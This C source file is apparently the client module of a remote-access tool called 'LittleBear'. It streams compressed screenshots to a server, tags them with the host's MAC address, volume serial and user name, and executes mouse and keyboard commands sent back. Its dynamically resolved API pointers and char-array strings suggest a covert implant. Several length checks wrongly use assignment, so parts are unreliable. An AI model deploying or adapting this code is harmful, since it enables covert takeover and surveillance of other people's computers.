

#include <windows.h>
#include "RemoteControlProc.h"
#include "GetScreenFrame.h"

#define REMOTE_CLIENT_SCREEN_MIN_INTERVAL	100
#define REMOTE_CLIENT_SCREEN_MAX_INTERVAL	2000
#define REMOTE_CLIENT_SCREEN_ADDINTERVAL	10
#define REMOTE_WAIT_FACTOR					4

#define SCREEN_COMPARE_FACTOR				4
//#define SCREEN_CHANGE_LITTLECOUNTER			1024
//#define SCREEN_CHANGE_COUNTER				SCREEN_CHANGE_LITTLECOUNTER * 4


DWORD __stdcall RemoteControlProc(int bitsperpix,char * lpBuf,int BufLen,char * lpZlibBuf,int ZlibBufLen,SOCKET hSock,char * lpBackup)
{
	char szShowInfo[1024];
	//DWORD iTimeDelay = 1000;

	char szScreenDCName[] = {'D','I','S','P','L','A','Y',0};

	DWORD dwLastRecvOKFlag = FALSE;
	DWORD dwSleepTimeValue = REMOTE_CLIENT_SCREEN_MIN_INTERVAL;
	int iRet = 0;
	int framecnt = 0;


	while (TRUE)
	{
		int dwbmbitssize = 0;
		char * pixelData = 0;
		int dwBufSize  = GetScreenFrame(bitsperpix,szScreenDCName,0,0,ScrnResolutionX,ScrnResolutionY,lpBuf,&pixelData,&dwbmbitssize);
		if (dwBufSize <= 0)
		{
			lpSleep(dwSleepTimeValue);
			continue;
		}

		int sendlen = 0;
		int changecnt = ScreenFrameChecker(lpBackup,pixelData,dwbmbitssize,bitsperpix/8,SCREEN_COMPARE_FACTOR);
		if (changecnt > 0 )
		{
			if (changecnt > 1)
			{
				memmove(lpBackup,pixelData,dwbmbitssize);
			}else{
				int tmp = changecnt;
			}

			LPNETWORKFILEHDR lpfhdr = (LPNETWORKFILEHDR)lpZlibBuf;

			lpfhdr->packhdr.cmd = REMOTE_CLIENT_SCREEN;
			LPUNIQUECLIENTSYMBOL lpUnique = (LPUNIQUECLIENTSYMBOL)&(lpfhdr->packhdr.unique);
			memmove(lpUnique->cMAC,cMAC,MAC_ADDRESS_LENGTH);
			lpUnique->compress = DATANONECOMPRESS;
			lpUnique->crypt = DATANONECRYPT;
			lpUnique->dwVolumeNO = ulVolumeSerialNo;

			long compbuflen = ZlibBufLen - sizeof(NETWORKFILEHDR);
			iRet = compress((Bytef*)lpZlibBuf + sizeof(NETWORKFILEHDR), (uLongf*)&compbuflen, (const Bytef*)lpBuf, (uLongf)dwBufSize);
			if (iRet != Z_OK)
			{
				lpwsprintfA(szShowInfo,"RemoteControlProc compress error code:%d,flat buffer size:%u,compress buffer size:%u\r\n",
					iRet,dwBufSize,compbuflen);
				WriteLittleBearLog(szShowInfo);
				lpSleep(dwSleepTimeValue);
				continue;
			}
			framecnt ++;
			if (framecnt%10 == 0)
			{
				lpwsprintfA(szShowInfo,"RemoteControlProc compress ok,zip size:%u,flat size:%u\r\n",compbuflen,dwBufSize);
				WriteLittleBearLog(szShowInfo);
			}

			lpfhdr->packhdr.packlen = sizeof(int) + compbuflen;
			lpfhdr->len = dwBufSize;
			sendlen = compbuflen + sizeof(NETWORKFILEHDR);
		}
		else if (changecnt == 0 /*|| changecnt == 1  || changecnt == 2*/)
		{
			LPNETWORKPACKETHEADER lphdr = (LPNETWORKPACKETHEADER)lpZlibBuf;
			lphdr->cmd = REMOTE_NONE_SCREEN;
			lphdr->packlen = 0;
			memmove(lphdr->unique.cMAC,cMAC,MAC_ADDRESS_LENGTH);
			lphdr->unique.compress = DATANONECOMPRESS;
			lphdr->unique.crypt = DATANONECRYPT;
			lphdr->unique.dwVolumeNO = ulVolumeSerialNo;
			memset(lphdr->unique.username, 0, 16);
			lstrcpyA((char*)lphdr->unique.username, (char*)gUserName);
			sendlen = sizeof(NETWORKPACKETHEADER);
		}
		else{
			lpSleep(dwSleepTimeValue);
			continue;
		}

		iRet = lpsend(hSock,lpZlibBuf,sendlen,0);
		if(iRet <= 0)
		{ 
			iRet = lpRtlGetLastWin32Error();
			lpwsprintfA(szShowInfo,"RemoteControlProc lpsend error code:%u\r\n",iRet);
			WriteLittleBearLog(szShowInfo);
			return NETWORK_ERROR_CODE;
		}

		iRet = lprecv(hSock,lpBuf,BufLen,0);		//last packet can use MSG_WAITALL with enough buffer
		if (iRet <= 0)
		{
			iRet = lpRtlGetLastWin32Error();
			lpwsprintfA(szShowInfo,"RemoteControlProc recv error code:%u\r\n",iRet);
			WriteLittleBearLog(szShowInfo);
			return NETWORK_ERROR_CODE;
		}else{
			*(iRet + lpBuf) = 0;
		}
		
		LPNETWORKPACKETHEADER lphdr = (LPNETWORKPACKETHEADER)lpBuf;
		DWORD dwCommand = lphdr->cmd;
		if(dwCommand == REMOTE_MOUSE_POS)
		{
			DWORD dwDataSize = lphdr->packlen;
			if (dwDataSize = sizeof(POINT) + sizeof(POINT))
			{
				LPREMOTECONTROLPOS pos = (LPREMOTECONTROLPOS)(lpBuf + sizeof(NETWORKPACKETHEADER));
				POINT stServerCurrent = pos->pos;
				POINT stPtServerMax = pos->size;

				int iXLocalMax = ScrnResolutionX;
				int iYLocalMax = ScrnResolutionY;

				POINT stPtLocalCurrent = {0};
				if (stPtServerMax.x != 0 && stPtServerMax.y != 0)
				{
					stPtLocalCurrent.x = (iXLocalMax * stServerCurrent.x )/ stPtServerMax.x;
					stPtLocalCurrent.y = (iYLocalMax * stServerCurrent.y )/ stPtServerMax.y;
					//mouse_event(MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_MOVE,stPtLocalCurrent.x,stPtLocalCurrent.y,0,0);
					lpSetCursorPos(stPtLocalCurrent.x,stPtLocalCurrent.y);
				}
			}

			dwLastRecvOKFlag = FALSE;
			dwSleepTimeValue = REMOTE_CLIENT_SCREEN_MIN_INTERVAL;

			lpSleep(dwSleepTimeValue/REMOTE_WAIT_FACTOR);
			continue;		
			//to action more faster not to sleep
		}
		else if (dwCommand == REMOTE_KEYBOARD)
		{
			if (lphdr->packlen == 2)
			{
				LPREMOTECONTROLKEY lpkey = (LPREMOTECONTROLKEY)(lpBuf + sizeof(NETWORKPACKETHEADER));
				unsigned char key = lpkey->key;
				unsigned char keyshift = lpkey->shiftkey;

				//unsigned char szKeyboardState[256];
				//memmove(szKeyboardState,pData,256);
				//iRet = SetKeyboardState(pData);

				if (keyshift)
				{
					keybd_event(VK_SHIFT,0,0,0);
					keybd_event(key,0,0,0);
					keybd_event(key,0,KEYEVENTF_KEYUP,0);
					keybd_event(VK_SHIFT,0,KEYEVENTF_KEYUP,0);
				}
				else{
					keybd_event(key,0,0,0);
					keybd_event(key,0,KEYEVENTF_KEYUP,0);
				}
			}

			dwLastRecvOKFlag = FALSE;
			dwSleepTimeValue = REMOTE_CLIENT_SCREEN_MIN_INTERVAL;
			
			lpSleep(dwSleepTimeValue/REMOTE_WAIT_FACTOR);
			continue;
		}
		else if (dwCommand == REMOTE_LEFTBUTTONDOWN || dwCommand == REMOTE_LEFTBUTTONDOUBLECLICK || 
			dwCommand == REMOTE_RBUTTONDOWN || dwCommand == REMOTE_RBUTTONDOUBLECLICK)
		{
			DWORD dwDataSize = lphdr->packlen;
			if (dwDataSize = sizeof(POINT) + sizeof(POINT))
			{
				LPREMOTECONTROLPOS pos = (LPREMOTECONTROLPOS)(lpBuf + sizeof(NETWORKPACKETHEADER));
				POINT stServerCurrent = pos->pos;
				POINT stPtServerMax = pos->size;

				int iXLocalMax = ScrnResolutionX;
				int iYLocalMax = ScrnResolutionY;

				POINT stPtLocalCur = {0};
				if (stPtServerMax.x != 0 && stPtServerMax.y != 0)
				{
					stPtLocalCur.x = (iXLocalMax * stServerCurrent.x )/ stPtServerMax.x;
					stPtLocalCur.y = (iYLocalMax * stServerCurrent.y )/ stPtServerMax.y;
					lpSetCursorPos(stPtLocalCur.x,stPtLocalCur.y);
					if (dwCommand == REMOTE_LEFTBUTTONDOWN)
					{
						mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
						mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
					}
					else if (dwCommand == REMOTE_RBUTTONDOWN)
					{
						mouse_event(MOUSEEVENTF_RIGHTDOWN,0,0,0,0);
						mouse_event(MOUSEEVENTF_RIGHTUP,0,0,0,0);
					}
					else if (dwCommand == REMOTE_RBUTTONDOUBLECLICK)
					{
						mouse_event(MOUSEEVENTF_RIGHTDOWN|MOUSEEVENTF_RIGHTUP,0,0,0,0);
						lpSleep(0);
						mouse_event(MOUSEEVENTF_RIGHTDOWN|MOUSEEVENTF_RIGHTUP,0,0,0,0);
					}
					else if (dwCommand == REMOTE_LEFTBUTTONDOUBLECLICK)
					{
						mouse_event(MOUSEEVENTF_LEFTDOWN|MOUSEEVENTF_LEFTUP,0,0,0,0);
						lpSleep(0);
						mouse_event(MOUSEEVENTF_LEFTDOWN|MOUSEEVENTF_LEFTUP,0,0,0,0);
					}
				}
			}

			dwLastRecvOKFlag = FALSE;
			dwSleepTimeValue = REMOTE_CLIENT_SCREEN_MIN_INTERVAL;
			lpSleep(dwSleepTimeValue/REMOTE_WAIT_FACTOR);
			continue;
		}
		else if (dwCommand == REMOTE_MOUSEWHEEL)
		{
			DWORD dwDataSize = lphdr->packlen;
			if (dwDataSize = sizeof(DWORD ) + sizeof(DWORD))
			{
				LPREMOTECONTROLWHEEL wheel = (LPREMOTECONTROLWHEEL)(lpBuf + sizeof(NETWORKPACKETHEADER));
				int key = wheel->delta & 0xffff;
				int delta = wheel->delta >> 16;
				int x = wheel->xy & 0xffff;
				int y = wheel->xy & 0xffff0000;

				mouse_event(MOUSEEVENTF_WHEEL,x,y,delta,0);
				lpSleep(0);
			}

			dwLastRecvOKFlag = FALSE;
			dwSleepTimeValue = REMOTE_CLIENT_SCREEN_MIN_INTERVAL;

			lpSleep(dwSleepTimeValue/REMOTE_WAIT_FACTOR);
			continue;		
			//to action more faster not to sleep
		}
		else if (dwCommand == RECV_DATA_OK )			
		{
			if (dwLastRecvOKFlag)	//mouse position is static
			{
				dwSleepTimeValue += REMOTE_CLIENT_SCREEN_ADDINTERVAL;
				if (dwSleepTimeValue >= REMOTE_CLIENT_SCREEN_MAX_INTERVAL)
				{
					dwSleepTimeValue = REMOTE_CLIENT_SCREEN_MAX_INTERVAL;
				}
			}
			else
			{
				dwLastRecvOKFlag = TRUE;
			}
			lpSleep(dwSleepTimeValue);
			continue;
		}
		else if (dwCommand == REMOTECONTROL_END)
		{
			WriteLittleBearLog("remotecontrol shutdown by server\r\n");
			break;
		}
		else
		{
			lpwsprintfA(szShowInfo,"RemoteControlProc unrecognized command:%u\r\n",dwCommand);
			WriteLittleBearLog(szShowInfo);
			break;
		}
	}
	return FALSE;
}



int ScreenFrameChecker(char * src,char * dst,int len,int bytesperpix,int selector){

	int counter = 0;
	if (bytesperpix == 2){
		WORD * wordsrc = (WORD *)src;
		WORD * worddst = (WORD *)dst;
		int times = len/bytesperpix/selector;
		for (int i = 0; i <times; )
		{
			if(wordsrc[i] != worddst[i]){
				counter ++;
			}

			i += selector;
		}
	}else if (bytesperpix == 1){

	}else if (bytesperpix == 4){

	} 

	return counter*selector;

	/*
	int counter = 0;
	__int64 * lisrc = (__int64 *)src;
	__int64 * lidst = (__int64 *)dst;
	int times = len/sizeof(__int64)/factor;
	for (int i = 0; i <times;  )
	{
		if(lisrc[i] != lidst[i]){
			counter ++;
		}
		i += factor;
	}
	return counter*factor;
	*/
}